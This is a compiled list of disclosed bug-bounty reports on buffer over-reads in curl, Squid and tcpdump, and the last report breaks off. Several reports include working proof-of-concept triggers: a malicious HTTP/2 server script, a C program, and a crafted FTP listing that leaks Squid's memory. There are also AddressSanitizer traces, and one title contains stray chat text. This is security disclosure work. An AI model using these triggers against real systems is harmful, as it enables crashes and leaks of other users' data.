# Buffer Over-read

_26 reports — High/Critical, disclosed_

### [Heap Buffer Over-read in lib/http2.c (on_header) handling PUSH_PROMISE frames](https://hackerone.com/reports/3480078)

- **Report ID:** `3480078`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** curl
- **Reporter:** @efrsxcv
- **Bounty:** - usd
- **Disclosed:** 2025-12-28T21:28:50.989Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
I have discovered a Heap Buffer Over-read vulnerability in `lib/http2.c` within the `on_header` callback function. When processing HTTP/2 `PUSH_PROMISE` frames, the code incorrectly uses the `%s` format specifier on raw pointers provided by `nghttp2`.

According to `nghttp2` documentation, the `name` and `value` pointers in the `on_header` callback are **not null-terminated**. By using `%s` without precision specifiers, `curl_maprintf` reads past the bounds of the allocated buffer into adjacent heap memory until it encounters a null byte. This leads to a Denial of Service (crash via OOM or invalid read) or potentially leaks sensitive heap memory.

## Vulnerability Details
* **File:** `lib/http2.c`
* **Function:** `on_header`
* **Vulnerable Logic:**

Inside the `on_header` function (handling `NGHTTP2_PUSH_PROMISE`), the code acts as follows:

```c
/* lib/http2.c around line 1642 in master */
h = curl_maprintf("%s:%s", name, value);
Since name and value are not null-terminated C-strings, curl_maprintf continues reading memory indefinitely.

Contrast with Secure Code: In the same file (handling trailers), the developers correctly used precision specifiers:
/* Correct usage found elsewhere in the file */
CURL_TRC_CF(data, cf, "[%d] trailer: %.*s: %.*s",
            stream->id, (int)namelen, name, (int)valuelen, value);

Affected version
Reproduced on the latest master branch (commit 752d... / curl 8.6.0-dev). Platform: Linux (Reproduced with ASAN build).

Steps To Reproduce:
To reproduce this issue, you need a malicious HTTP/2 server that sends a PUSH_PROMISE frame with a payload that triggers the over-read.

Note: While curl CLI disables HTTP/2 Push by default, libcurl applications enabling it are vulnerable. For reproduction purposes using the CLI, we must ensure Push is enabled.

1. Compile curl with AddressSanitizer (ASAN)
./configure --enable-debug --enable-curldebug --with-nghttp2 --with-openssl CFLAGS="-fsanitize=address -g -O0" LDFLAGS="-fsanitize=address"
make -j4

2. Setup Malicious Python Server Save the following script as repro.py. It requires pip install h2. (You also need server.key and server.crt for TLS).
import socket
import ssl
from h2.connection import H2Connection
from h2.events import RequestReceived
from h2.config import H2Configuration
from h2.settings import SettingCodes

def run_server():
    host, port = '127.0.0.1', 8443
    ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ctx.load_cert_chain(certfile="server.crt", keyfile="server.key")
    ctx.set_alpn_protocols(['h2'])

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen(1)
    print(f"Listening on {port}...")

    while True:
        conn, addr = sock.accept()
        try:
            tls_conn = ctx.wrap_socket(conn, server_side=True)
            config = H2Configuration(client_side=False)
            h2 = H2Connection(config=config)
            h2.initiate_connection()
            tls_conn.sendall(h2.data_to_send())

            while True:
                data = tls_conn.recv(65535)
                if not data: break
                events = h2.receive_data(data)
                for event in events:
                    if isinstance(event, RequestReceived):
                        # Force enable push in python state to bypass checks
                        h2.remote_settings[SettingCodes.ENABLE_PUSH] = 1

                        # Payload: Long string without null terminator concept in H2
                        headers = [
                            (':method', 'GET'), (':path', '/pwn'),
                            (':scheme', 'https'), (':authority', 'localhost'),
                            ('x-trigger', 'A' * 5000)
                        ]
                        h2.push_stream(event.stream_id, 2, headers)
                        tls_conn.sendall(h2.data_to_send())

                tls_conn.sendall(h2.data_to_send())
        except Exception:
            pass
        finally:
            conn.close()

if __name__ == '__main__':
    run_server()

3. Run the Attack
- Terminal 1: python3 repro.py
- Terminal 2: ./src/curl -v -k --http2 https://127.0.0.1:8443 (Ensure the libcurl used accepts Push, or modify lib/http2.c to force ENABLE_PUSH=1 for testing).

4. Observe Results The curl process will either crash with an ASAN report or return error (56) ... returned -902:The user callback function failed.

The error -902 confirms that on_header failed, likely due to memory allocation failure when curl_maprintf attempted to read gigabytes of heap data starting from the non-null-terminated buffer.

## Impact

Impact
This is a heap buffer over-read.
1. Denial of Service: It causes the client to crash or exhaust memory.
2. Information Leak: It may leak adjacent heap data into the header string, which could be processed or logged by the application.

Recommended Fix
Update the curl_maprintf call to use precision specifiers with the length provided by nghttp2:
h = curl_maprintf("%.*s:%.*s", (int)namelen, name, (int)valuelen, value);

---

### [Out-of-bounds read in HTTP method handling causes undefined behavior and potential crash This is sharp, Gaurav. We’ve got a real memory-safety bug ins](https://hackerone.com/reports/3434510)

- **Report ID:** `3434510`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** curl
- **Reporter:** @gaurav_7777
- **Bounty:** - usd
- **Disclosed:** 2025-11-20T09:20:56.480Z
- **CVE(s):** -

**Vulnerability Information:**

Summary
-​‍​‌‍​‍‌​‍​‌‍​‍‌ Component: libcurl core HTTP handling (HTTP/2 request translation and CONNECT detection)
- Type: out-of-bounds read resulting from missing null-termination
- Impact: Behavior not defined by the specification, the program can crash (DoS) and CONNECT requests can be misclassified
- Root cause: The method string was copied without a null ​‍​‌‍​‍‌​‍​‌‍​‍‌termin

Affected​‍​‌‍​‍‌​‍​‌‍​‍‌ code paths
- Struct layout:
- struct httpreq { ... char method[1]; }
- Allocation and copy (no NUL):
- req = calloc(1, sizeof(*req) + m_len);
- memcpy(req->method, method, m_len);

- Unsafe uses:
- strcmp("CONNECT", req->method) — assumes null-terminated string
- strlen(req->method) — sizes HTTP/2 pseudo-header :method

Direct risk: Both strcmp and strlen may access memory beyond what has been allocated if req->method[m_len] is out-of-bounds. The impact varies with the allocator/layout; ASan will always detect ​‍​‌‍​‍‌​‍​‌‍​‍‌this.

Steps​‍​‌‍​‍‌​‍​‌‍​‍‌ to reproduce (concise)

- Prereqs: make sure CMake and nghttp2 are installed
- What version outputs are you having:
```bash
 cmake --version 
```
```text
→ 3.26.2
```

```bash
pkg-config --modversion libnghttp2 
```
```text
→ 1.52.0
```

Build curl with ASan + HTTP/2:


```bash
mkdir -p build && cmake -B build -DCMAKE_BUILD_TYPE=Debug -DCMAKE_C_FLAGS='-O1 -g -fsanitize=address' -DCMAKE_EXE_LINKER_FLAGS='-fsanitize=address' -DCURL_USE_NGHTTP2=ON
```
```bash
cmake --build build -j"$(nproc)"
```
Verify binary and features:

```bash
./src/curl ​‍​‌‍​‍‌​‍​‌‍​‍‌--version
```
{F5027206}

## Impact

Impact

-​‍​‌‍​‍‌​‍​‌‍​‍‌ Denial of Service/crash: Out of bounds read occurring during the creation of HTTP/2 pseudo-headers or checking CONNECT logic.
-​‍​‌‍​‍‌​‍​‌‍​‍‌ Logic flaw: The function for detecting CONNECT might behave differently due to a comparison of an uninitialized value being performed.

- Trigger surface: Any path which produces a struct httpreq (e.g., custom methods) and then executes HTTP/2 translation or CONNECT ​‍​‌‍​‍‌​‍​‌‍​‍‌checks

Proposed​‍​‌‍​‍‌​‍​‌‍​‍‌ repair (minimal and robust)

- In both creators, not only add a null terminator but also allocate memory for ​‍​‌‍​‍‌​‍​‌‍​‍‌it:

```diff
- req = calloc(1, sizeof(*req) + m_len);
+ req = calloc(1, sizeof(*req) + m_len + 1);
  if(!req) goto out;
  memcpy(req->method, method, m_len);
+ req->method[m_len] = '\0';
```

-​‍​‌‍​‍‌​‍​‌‍​‍‌ Locations to change:
Curl_http_req_make
Curl_http_req_make2
This change removes local undefined reads without changing the logic. Optional hardening: replace ​‍​‌‍​‍‌​‍​‌‍​‍‌strcmp("CONNECT",

---

### [Heap Buffer Overflow in Curl_memdup0() via CURLOPT_COPYPOSTFIELDS/CURLOPT_POSTFIELDSIZE Mismatch](https://hackerone.com/reports/3292590)

- **Report ID:** `3292590`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** curl
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2025-08-09T13:00:47.625Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
A heap buffer overflow vulnerability exists in libcurl's `Curl_memdup0()` function when handling `CURLOPT_COPYPOSTFIELDS` operations. The vulnerability occurs when libcurl internally processes POST data where the specified `CURLOPT_POSTFIELDSIZE` exceeds the actual buffer size of data set via `CURLOPT_COPYPOSTFIELDS`. This is a legitimate use case that libcurl should handle safely, but currently results in out-of-bounds memory access.

## POC
### Environment
* libcurl version: 8.16.0-DEV (master branch)
* Compiler: Clang 20.1.8 with Address Sanitizer
* OS: MacOS 26 Dev Beta 5

`gcc -fsanitize=address -g -o poc poc.c -lcurl`
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

#define ACTUAL_SIZE 105
#define CLAIMED_SIZE 976909154L

int main(void) {
    printf("[+] libcurl Heap Buffer Overflow PoC\n");
    printf("[+] CURLOPT_COPYPOSTFIELDS vulnerability reproduction\n\n");
    
    /* Initialize libcurl */
    curl_global_init(CURL_GLOBAL_ALL);
    CURL *curl = curl_easy_init();
    
    if(!curl) {
        fprintf(stderr, "[!] Failed to initialize curl\n");
        return 1;
    }
    
    printf("[+] libcurl initialized successfully\n");
    
    /* CRITICAL: Allocate buffer on HEAP, not stack */
    char *heap_buffer = (char *)malloc(ACTUAL_SIZE);
    if(!heap_buffer) {
        fprintf(stderr, "[!] Failed to allocate heap buffer\n");
        curl_easy_cleanup(curl);
        return 1;
    }
    
    /* Fill with test data */
    memset(heap_buffer, 'A', ACTUAL_SIZE - 1);
    heap_buffer[ACTUAL_SIZE - 1] = '\0';
    
    printf("[+] Allocated HEAP buffer: %d bytes at %p\n", ACTUAL_SIZE, (void*)heap_buffer);
    printf("[+] Buffer content: \"%.50s...\"\n", heap_buffer);
    
    /* Set a basic URL (won't actually connect) */
    curl_easy_setopt(curl, CURLOPT_URL, "http://example.com");
    
    /* Set POST mode */
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    
    /* VULNERABILITY TRIGGER - Set size much larger than actual buffer */
    printf("[+] Setting CURLOPT_POSTFIELDSIZE to: %ld bytes\n", CLAIMED_SIZE);
    CURLcode res = curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, CLAIMED_SIZE);
    if(res != CURLE_OK) {
        fprintf(stderr, "[!] Failed to set POSTFIELDSIZE: %s\n", curl_easy_strerror(res));
        free(heap_buffer);
        curl_easy_cleanup(curl);
        return 1;
    }
    printf("[+] CURLOPT_POSTFIELDSIZE set successfully\n");
    
    /* TRIGGER THE HEAP BUFFER OVERFLOW */
    printf("[+] Calling CURLOPT_COPYPOSTFIELDS with %d-byte heap buffer...\n", ACTUAL_SIZE);
    printf("[!] This should trigger HEAP buffer overflow in Curl_memdup0()\n");
    printf("[!] AddressSanitizer should detect out-of-bounds read on HEAP\n\n");
    
    /* This will cause Curl_memdup0() to read CLAIMED_SIZE bytes from ACTUAL_SIZE buffer */
    res = curl_easy_setopt(curl, CURLOPT_COPYPOSTFIELDS, heap_buffer);
    
    if(res == CURLE_OK) {
        printf("[?] CURLOPT_COPYPOSTFIELDS succeeded (unexpected if ASAN enabled)\n");
        printf("[?] The overflow may have occurred silently\n");
    } else {
        printf("[!] CURLOPT_COPYPOSTFIELDS failed: %s\n", curl_easy_strerror(res));
    }
    
    /* Cleanup */
    free(heap_buffer);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    
    printf("[+] If you see this, the overflow was not detected\n");
    printf("[!] Run with AddressSanitizer: gcc -fsanitize=address poc.c -lcurl\n");
    
    return 0;
}
```

## Vulnerable Code Path 
`CURLOPT_POSTFIELDSIZE` set to 976909154
`CURLOPT_COPYPOSTFIELDS` given 105-byte buffer
`Curl_memdup0()` blindly trusts the size parameter
No validation that size matches actual buffer
Detection: Compile with AddressSanitizer (-fsanitize=address) to observe heap buffer overflow.

```
[+] libcurl Heap Buffer Overflow PoC
[+] CURLOPT_COPYPOSTFIELDS vulnerability reproduction

[+] libcurl initialized successfully
[+] Allocated HEAP buffer: 105 bytes at 0x60b000002fb0
[+] Buffer content: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..."
[+] Setting CURLOPT_POSTFIELDSIZE to: 976909154 bytes
[+] CURLOPT_POSTFIELDSIZE set successfully
[+] Calling CURLOPT_COPYPOSTFIELDS with 105-byte heap buffer...
[!] This should trigger HEAP buffer overflow in Curl_memdup0()
[!] AddressSanitizer should detect out-of-bounds read on HEAP

=================================================================
==33081==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60b000003019 at pc 0x000101451c64 bp 0x00016f33df30 sp 0x00016f33d6d0
READ of size 976909154 at 0x60b000003019 thread T0
    #0 0x000101451c60 in memcpy+0x284 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x85c60)
    #1 0x0001acb23954 in Curl_memdup0+0x44 (libcurl.4.dylib:arm64e+0x4e954)
    #2 0x0001acb1a678 in Curl_vsetopt+0xc60 (libcurl.4.dylib:arm64e+0x45678)
    #3 0x0001acb1d4c0 in curl_easy_setopt+0x20 (libcurl.4.dylib:arm64e+0x484c0)
    #4 0x000100ac0b50 in main poc_heap_overflow_fixed.c:73
    #5 0x000190b41920 in start+0x18fc (dyld:arm64e+0x3920)

0x60b000003019 is located 0 bytes after 105-byte region [0x60b000002fb0,0x60b000003019)
allocated by thread T0 here:
    #0 0x00010140930c in malloc+0x78 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x3d30c)
    #1 0x000100ac0904 in main poc_heap_overflow_fixed.c:36
    #2 0x000190b41920 in start+0x18fc (dyld:arm64e+0x3920)

SUMMARY: AddressSanitizer: heap-buffer-overflow (libcurl.4.dylib:arm64e+0x4e954) in Curl_memdup0+0x44
Shadow bytes around the buggy address:
  0x60b000002d80: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
  0x60b000002e00: fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd
  0x60b000002e80: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa
  0x60b000002f00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa
  0x60b000002f80: fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00
=>0x60b000003000: 00 00 00[01]fa fa fa fa fa fa fa fa fa fa fa fa
  0x60b000003080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x60b000003100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x60b000003180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x60b000003200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x60b000003280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==33081==ABORTING
```

## Impact

## Severity: High

### Security Impact:
> Information Disclosure: Out-of-bounds read exposes adjacent heap memory contents
> Potential RCE: Heap layout manipulation may enable code execution in specific scenarios
> Denial of Service: Memory access violations cause application crashes
> Data Corruption: Heap metadata corruption affects application stability

### Attack Scenarios:
> Applications that accept user-controlled POST data sizes
> Network services processing untrusted HTTP POST parameters
> Any application where attackers can influence both POST data and size parameters

### Real-World Relevance:
> This affects legitimate use cases where applications might:
> Truncate or pad POST data based on protocol requirements
> Process variable-length content with fixed-size headers
> Handle network protocols with length prefixes

**Summary (researcher):**

This report demonstrates a heap buffer overflow in `Curl_memdup0()` triggered when `CURLOPT_COPYPOSTFIELDS` is called after `CURLOPT_POSTFIELDSIZE` is set to a value larger than the actual buffer length.

While this may be considered an API contract violation, the resulting behavior is not merely “undefined”, it is predictably exploitable memory corruption in a widely deployed network library. In practice, `POST` data length values can originate from untrusted sources such as:
	->	Length fields in higher-layer protocols
	->	User-controlled input in proxying or gateway scenarios
	->	Data marshalled between disparate components where size and buffer are provided separately

A malicious actor does not need to be the developer to exploit this; they only need influence over the size parameter in an integration that uses `CURLOPT_COPYPOSTFIELDS`.

Robust, security-conscious libraries defend against common misuse, especially when the misuse is trivially detectable at runtime. Adding a bounds check in `Curl_memdup0()` (e.g., verifying the buffer length before memcpy) would prevent heap memory disclosure, application crashes, or potential code execution, and would not break correct API usage.

In security terms:
	->	Bug class: Heap Buffer Overflow
	->	Impact: Information disclosure, DoS, potential RCE with heap shaping
	-> Root cause: No bounds validation in Curl_memdup0() when size parameter is larger than provided data
	-> Fix class: Defensive length validation before memcpy

*A caller bug should not translate into an attacker-controlled heap overflow in a security-critical library.*

---

### [Squid leaks previous content from reusable buffer](https://hackerone.com/reports/824163)

- **Report ID:** `824163`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @jeriko_one
- **Bounty:** - usd
- **Disclosed:** 2021-08-26T23:37:23.822Z
- **CVE(s):** CVE-2019-12528

**Vulnerability Information:**

## Summary:
A malicious response to a FTP request can cause Squid to miscalculate the length of a string copying data past the terminating NULL. Due to Squid's memory pool the contents that is exposed could range from internal data, to other user's private Request/Response to Squid. 

This exist in Squid-4.9 and Below and was fixed in Squid-4.10
This vulnerability was assigned CVE-2019-12528.

## Steps To Reproduce:
A custom config is should not be needed. 
I've attached a python script that returns the needed response to trigger this.

1) Start Squid 
```
./sbin/squid
```

2) Start your malicious FTP Server
```
./squid_leak.py 8080
```

3) Make a request to the FTP server via Squid.
```
printf "GET ftp://<ftp ip>:8080/ HTTP/1.1\r\n\r\n" | nc <squid hostname> 3128
```

4) The FTP server should have sent the listing. A message from it saying
```
<- 226 Listing sent
```
Should be visible

The leaked data is now in the HTML that Squid has returned. The data will be under the line 

```<th nowrap="nowrap"><a href="../">Parent Directory</a> (<a href="/">Root Directory</a>)</th>```

Within the following <tr>

For reference a normal response would look like 

```
<tr class="entry"><td colspan="5">hi</td></tr>
```

## Analysis
The issue begins in Ftp::Gateway::parsingListing the relevant snippet being

```
    line = (char *)memAllocate(MEM_4K_BUF);
    ++end;
    s = sbuf;
    s += strspn(s, crlf);

    for (; s < end; s += strcspn(s, crlf), s += strspn(s, crlf)) {
        debugs(9, 7, HERE << "s = {" << s << "}");
        linelen = strcspn(s, crlf) + 1;
		<snip>
        xstrncpy(line, s, linelen);
		<snip>
		if (htmlifyListEntry(line, html)) 
```

A crucial thing to notice here is the following: 
- line is allocated with memAllocate(MEM_4K_BUF) this is what will lead us to reading previous content. Buffers allocated via this method aren't ever free'd, but are put back into their respective pools. Zeroing of the buffer is possible, but is not enabled for this type of memory.

Within ftpListParseParts (FtpGateway.cc) is where the root of the vulnerability exist. 
This function can handle various formats for listings. 

A common procedure is done on all of them before that then. They are converted
into tokens by strtok.
```
    for (t = strtok(xbuf, w_space); t && n_tokens < MAX_TOKENS; t = strtok(NULL, w_space)) {
        tokens[n_tokens] = xstrdup(t);
        ++n_tokens;
    }
```
Please note that strok uses w_space as delimiters 
```
	#define w_space     " \t\n\r"
```
The listing format that we'll focus on is DOS format (FtpGateway.cc:648)

For listings that aren't directories the following code is executed:
```
        } else {
            /* A file. Name begins after size, with a space in between */
            snprintf(tbuf, 128, " %s %s", tokens[2], tokens[3]);
            ct = strstr(buf, tbuf);

            if (ct) {
                ct += strlen(tokens[2]) + 2;
            }
        }

        p->name = xstrdup(ct ? ct : tokens[3]);
```

Squid will put tokens[2] and tokens[3] in a temporary buffer with 2 spaces. It
then searches for this string in the original line setting ct to the start of
this string. It then increments ct by the length of tokens[2] + 2. What is
pointed to now is used as the name. 

The false assumption here is that tokens will be separated by spaces in the
original line.

Consider the following example where \t denotes a tab, and * is for repetition:

```
04-05-70 09:33PM\tA*126 A*126
```

Going through the referenced code path when snprintf is called tbuf will be
filled as: " A*126". Then when strstr is called, it'll find the token, but it
won't be token[2] it'll be token[3] as token[2] started with a tab. When it
increments by the length strlen(tokens[2]) + 2 it'll put ct past the
terminating NULL byte of this line.

The contents is then copied into another buffer which will be displayed to the attacker

 p->name = xstrdup(ct ? ct : tokens[3]);

Setting a breakpoint in we can confirm that it's leaking data

Confirming that the tokens are 126:
```
(gdb) call (size_t)strlen(tokens[2])
$2 = 126
(gdb) call (size_t)strlen(tokens[3])
$3 = 126
```
Here ct is set to the wrong token since it's looking for " A"
```
snprintf(tbuf, 128, " %s %s", tokens[2], tokens[3]);
(gdb) n
675	            ct = strstr(buf, tbuf);
(gdb) call (size_t)strlen(tbuf)
$4 = 127

(gdb) p tbuf
$5 = " ", 'A' <repeats 126 times>

(gdb) p ct
$6 = 0x62100006918f " ", 'A' <repeats 126 times>

678	                ct += strlen(tokens[2]) + 2;
(gdb) call (size_t) strlen(tokens[2]) + 2
$8 = 128
```
Here we see ct is now past the terminating NULL
```
(gdb) x/2xb ct - 1
0x62100006920e:	0x00	0x66
```

## Impact

An attacker can leak sensitive information from the Squid process. This could include other user's Request and Response which could have headers, cookies, full bodies, and post data.

---

### [ The VTP parser in tcpdump before 4.9.2 has a buffer over-read in print-vtp.c:vtp_print()](https://hackerone.com/reports/802846)

- **Report ID:** `802846`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @bags
- **Bounty:** - usd
- **Disclosed:** 2021-08-22T03:56:50.541Z
- **CVE(s):** CVE-2017-13033

**Vulnerability Information:**

Hello,

The vulnerable code portion is linked below. The linked function is responsible for printing VTP packet payload information to the terminal (e.g., stdout)

https://github.com/the-tcpdump-group/tcpdump/commit/ae83295915d08a854de27a88efac5dd7353e6d3f#diff-8c6895b252e6da31d60a7866973d5787L262-L268

The issue may be reproduced as follows

Check out vulnerable tcpdump commit (< 4.9.2) as follows

```
$ git clone -b e0d8ee571438c755ff988f70886f8c4f5e9a8434 https://github.com/the-tcpdump-group/tcpdump
Build it with afl and AddressSanitizer as follows (please install libpcap before this step)
$ CC=afl-gcc
$ AFL_USE_ASAN=1 make -j
```

Run tcpdump against linked payload (link: https://github.com/the-tcpdump-group/tcpdump/blob/ae83295915d08a854de27a88efac5dd7353e6d3f/tests/vtp_asan-3.pcap?raw=true)

```
$ tcpdump -nvr <payload>
reading from file /tmp/vtp_asan-3.pcap, link-type MFR (FRF.16 Frame Relay)
=================================================================
==3747==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61200000015c at pc 0x562e64fcc5d2 bp 0x7ffdd3033300 sp 0x7ffdd30332f0
READ of size 1 at 0x61200000015c thread T0
    #0 0x562e64fcc5d1 in fn_printzp util-print.c:217
    #1 0x562e64fb757e in vtp_print print-vtp.c:262
    #2 0x562e64ea3aae in snap_print print-llc.c:493
    #3 0x562e64e0cba5 in fr_print print-fr.c:336
    #4 0x562e64e0dc9e in mfr_print print-fr.c:563
    #5 0x562e64d57e1e in pretty_print_packet print.c:332
    #6 0x562e64d30d8d in print_packet tcpdump.c:2590
    #7 0x562e65003a78 in pcap_offline_read savefile.c:561
    #8 0x562e64ff29ee in pcap_loop pcap.c:2737
    #9 0x562e64d2474d in main tcpdump.c:2093
    #10 0x7f9726cb6b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)
    #11 0x562e64d2c769 in _start (/home/bhargava/work/github/tcpdump/tcpdump+0x17b769)

0x61200000015c is located 0 bytes to the right of 284-byte region [0x612000000040,0x61200000015c)
allocated by thread T0 here:
    #0 0x7f972737ab50 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)
    #1 0x562e6500480a in pcap_check_header sf-pcap.c:404

SUMMARY: AddressSanitizer: heap-buffer-overflow util-print.c:217 in fn_printzp
Shadow bytes around the buggy address:
  0x0c247fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c247fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c247fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c247fff8000: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
  0x0c247fff8010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c247fff8020: 00 00 00 00 00 00 00 00 00 00 00[04]fa fa fa fa
  0x0c247fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff8060: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff8070: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==3747==ABORTING
```

It is acknowledged here(link: https://github.com/the-tcpdump-group/tcpdump/commit/ae83295915d08a854de27a88efac5dd7353e6d3f) that I (Bhargava Shastry) am the original reporter of the issue.

To prove that this hackerone account belongs to me, I have hosted a file with the following message on my github page(link: https://bshastry.github.io/.well-known/hackerone.txt)

hello @turtle_shell @hackerone

If you have any further queries, please let me know.

## Impact

I believe that information disclosure is possible.

---

### [CVE-2017-13050: The RPKI-Router parser in tcpdump before 4.9.2 has a buffer over-read in print-rpki-rtr.c:rpki_rtr_pdu_print()](https://hackerone.com/reports/802863)

- **Report ID:** `802863`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @bags
- **Bounty:** - usd
- **Disclosed:** 2021-08-22T03:56:24.740Z
- **CVE(s):** CVE-2017-13050

**Vulnerability Information:**

Hello,

The vulnerable code portion is linked below. The linked function is responsible for printing RPKI-Router packet payload information to the terminal (e.g., stdout)

https://github.com/the-tcpdump-group/tcpdump/commit/83c64fce3a5226b080e535f5131a8a318f30e79b

The issue may be reproduced as follows

Check out vulnerable tcpdump commit (< 4.9.2) as follows

```
$ git clone -b 289c672020280529fd382f3502efab7100d638ec https://github.com/the-tcpdump-group/tcpdump
```

Build it with afl and AddressSanitizer as follows (please install libpcap before this step)

```
$ CC=afl-gcc
$ AFL_USE_ASAN=1 make -j
```

Run tcpdump against linked payload (link: https://github.com/the-tcpdump-group/tcpdump/blob/83c64fce3a5226b080e535f5131a8a318f30e79b/tests/rpki-rtr-oob.pcap?raw=true)

```
$ tcpdump -nvr <payload>
reading from file /tmp/rpki-rtr-oob.pcap, link-type EN10MB (Ethernet)
=================================================================
==3569==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6070000000e2 at pc 0x562a16588231 bp 0x7ffc51f88550 sp 0x7ffc51f88540
READ of size 4 at 0x6070000000e2 thread T0
    #0 0x562a16588230 in EXTRACT_32BITS extract.h:190
    #1 0x562a16588230 in rpki_rtr_pdu_print print-rpki-rtr.c:243
    #2 0x562a16588230 in rpki_rtr_print print-rpki-rtr.c:355
    #3 0x562a165bfb52 in tcp_print print-tcp.c:725
    #4 0x562a1645f9e7 in ip_print_demux print-ip.c:396
    #5 0x562a1645f9e7 in ip_print print-ip.c:673
    #6 0x562a16413cef in ethertype_print print-ether.c:334
    #7 0x562a164167e1 in ether_print print-ether.c:237
    #8 0x562a164167e1 in ether_if_print print-ether.c:262
    #9 0x562a1637b01e in pretty_print_packet print.c:332
    #10 0x562a16353f8d in print_packet tcpdump.c:2590
    #11 0x562a16627168 in pcap_offline_read savefile.c:561
    #12 0x562a166160de in pcap_loop pcap.c:2737
    #13 0x562a1634794d in main tcpdump.c:2093
    #14 0x7f1aefe87b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)
    #15 0x562a1634f969 in _start (/home/bhargava/work/github/tcpdump/tcpdump+0x17c969)

0x6070000000e2 is located 13 bytes to the right of 69-byte region [0x607000000090,0x6070000000d5)
allocated by thread T0 here:
    #0 0x7f1af054bb50 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)
    #1 0x562a16627efa in pcap_check_header sf-pcap.c:404

SUMMARY: AddressSanitizer: heap-buffer-overflow extract.h:190 in EXTRACT_32BITS
Shadow bytes around the buggy address:
  0x0c0e7fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c0e7fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c0e7fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c0e7fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c0e7fff8000: fa fa fa fa 00 00 00 00 00 00 00 00 00 fa fa fa
=>0x0c0e7fff8010: fa fa 00 00 00 00 00 00 00 00 05 fa[fa]fa fa fa
  0x0c0e7fff8020: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa
  0x0c0e7fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0e7fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0e7fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0e7fff8060: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
